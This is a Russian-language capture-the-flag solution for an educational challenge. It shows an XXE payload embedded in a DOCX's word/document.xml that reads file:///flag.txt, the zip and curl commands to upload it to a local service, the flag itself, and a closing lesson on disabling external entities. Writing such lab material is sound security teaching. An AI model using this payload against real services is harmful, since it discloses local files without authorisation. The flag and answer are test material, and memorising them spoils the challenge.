# Решение

## Идея

DOCX является ZIP-архивом. Сервис извлекает `word/document.xml` и разбирает его XML-парсером с разрешёнными внешними сущностями. Сущность `file:///flag.txt` подставит содержимое файла в документ.

## Шаги

1. Создать `word/document.xml` со следующим содержимым:

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
   <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
     <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
   </w:document>
   ```

2. Упаковать файл, сохранив путь `word/document.xml`:

   ```bash
   zip -r payload.docx word/
   ```

3. Отправить заявление:

   ```bash
   curl -F name=a -F family=b -F father=c -F team=d -F type=get_hints \
     -F file=@payload.docx http://127.0.0.1:5103/
   ```

4. Прочитать раскрытый флаг в сериализованном XML.

## Флаг

`edu_ctf{xxe_reads_local_files}`

## Чему учит задача

Составной офисный формат может содержать XML. Для недоверенных документов внешние сущности и DTD должны быть отключены.
